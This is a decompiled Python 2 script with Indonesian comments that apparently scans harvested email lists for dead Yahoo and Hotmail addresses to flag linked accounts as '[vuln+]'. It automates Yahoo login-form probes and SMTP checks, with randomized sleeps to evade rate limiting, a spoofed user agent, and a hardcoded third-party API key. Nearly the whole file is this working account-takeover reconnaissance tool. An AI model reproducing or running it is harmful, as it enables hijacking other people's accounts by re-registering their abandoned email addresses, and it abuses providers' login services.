# uncompyle6 version 3.3.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.16 (default, Apr 24 2019, 10:05:31) 
# [GCC 4.2.1 Compatible Android (5058415 based on r339409) Clang 8.0.2 (https://a
#import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, cookielib
import os, sys, time, datetime, random, re, json, urllib2
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
else:
    try:
        import requests
    except ImportError:
        os.system('pip2 install requests')

from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
W = "\033[0m"
G = '\033[32;1m'
R = '\033[31;1m'
bgm = '\x1b[41m'
p = '\x1b[0m'
    
def masuk():
    global toket
    #os.system('reset')

    print R+'.                  /)-._   .'.center(44)
    print ".          Leo    Y. ' _]  .".center(44)
    print '.          ,.._   |`--"=   .'.center(44)
    print '.         /    "-/   \     .'.center(44)
    print './)      |   |_     `\|___ .'.center(44)
    print '.\:::::::\___/_\__\_____,,\.'.center(44)
    print W + ' '
    print ('Mpu YONO').center(44)
    print (W + '     [' + G +'ALAT SCANNER EMAIL GOSONG DOREMON'+ W + ']'+ G)
    print (W + '      hanya utk file awalan allm_*.txt'+ G)
    print ' '
    
    #------------------------------
    noa = 1
    plh = ''
    kun = []
    berhasil = []
    
    try:
      os.mkdir('output')
    except OSError:
      pass

    #LOOP, cari semua file *.bj (cookies) dalam dir....print all.
    for i in os.listdir(sys.path[0]+'/output'):
        #klo file i = "*.bj"
        if "allm_" in i :
            # [1] 100003078072846.
            # [2] 100001014566278.
            print '  [' + str(noa) + '] ' + i[:-3]
            #append, masukkan nama file, dalam array list
            kun.append(i)
            #incr counter
            noa += 1
    
    #print 'file root ' + str(kun) +' - ' + sys.path[0]
    #klo array tdk kosong
    if kun != []:
      #print 'file ada'
      #input nomer =plh
      plh = input('\n[*]pilih akun no.brapa?(enter=exit): ')
      if plh == '' :
        sys.exit()
      save = open('output/Vuln'+kun[plh-1][4:], 'w')
      #os.system('dir')
      #Load FILE by number, from array list "kun[]"
      #cj.load(sys.path[0] + '/' + kun[plh - 1])
      #------------------------------
      #open replace for write
      timz=0
      timzz=0
      rdm1=random.randrange(10, 15)
      rdm2=random.randrange(10, 15)
      lockz=0
      target = raw_input("[!]Sampai mana tadi?(Enter=Awal):")
      if target == '': 
        target = 'z@@2'
      else:
        print "oh iya lupa,td smpai "+target+".. Ok,Lanjut.."
        lockz=1
	
      #open for read only
      with open('output/'+kun[plh - 1]) as fp:
       for cnt, line in enumerate(fp):
         
         if target in line.split(',')[0] and lockz==1 :
          lockz=0
         #print("Line {}: {}".format(cnt, line))
         if "yahoo.com" in line.split(',')[0] and lockz==0 :
          if timz == rdm1 : 
            timz = 0
            rdm1=random.randrange(10, 15)
            rdmz1=random.randrange(65, 130)
            print '[+]satpam lewat.. '+str(rdmz1)
            time.sleep(rdmz1)
          timz=timz+1

          try:
            mail = line.split(',')[0].strip()
            yahoo = re.compile('@.*')
            try:
              br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
            except urllib2.URLError as e:
              print "URLError................."
              continue

            br._factory.is_html = True
            br.select_form(nr=0)
            br['username'] = mail
            try:
              klik = br.submit().read()
              jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
            except urllib2.URLError as e:
              print "URLError................."
              continue

            try:
                pek = jok.search(klik).group()
            except:
                continue
            if '"messages.ERROR_INVALID_USERNAME">' in pek:
                save.write('[vuln+],' +line.strip() + '\n')
                print G+bgm + '[vuln+]' + p + line
                berhasil.append('[vuln+],' +line.strip())
            else:
                print line.split(',')[0].strip()
          except KeyError:
            pass

         if "hotmail.com" in line.split(',')[0] and lockz==0 :
          if timzz == rdm2 : 
            timzz = 0
            rdm2=random.randrange(10, 15)
            rdmz2=random.randrange(65, 130)
            print '[+]satpam lewat.. '+str(rdmz2)
            time.sleep(rdmz2)
          timzz=timzz+1

          print line.split(',')[0].strip()
          try:
            mail = line.split(',')[0].strip()

            try:
              url = ("http://apilayer.net/api/check?access_key=7a58ece2d10e54d09e93b71379677dbb&email=" + mail + "&smtp=1&format=1")
              cek = json.loads(requests.get(url).text)
            except urllib2.URLError as e:
              print "URLError................."
              continue

            if cek['smtp_check'] == 0:
              save.write('[vuln+],' +line.strip() + '\n')
              print G+bgm + '[vuln+]' + p + line
              berhasil.append('[vuln+],' +line.strip())
            else:
              print line.split(',')[0].strip()
          except KeyError:
            pass


      print ' '
      print G+bgm + '------------------------------------'
      print p+G+'Summary:'
      print "\n".join(berhasil)
      print ' '
      print '\[+]Done.'
      print '\[+]Total: ' + str(len(berhasil))
      print '\[+]File saved: /output/Vuln'+kun[plh - 1][4:]
      print G+bgm + '------------------------------------'+p      
      save.close()

if __name__ == '__main__':
    masuk()

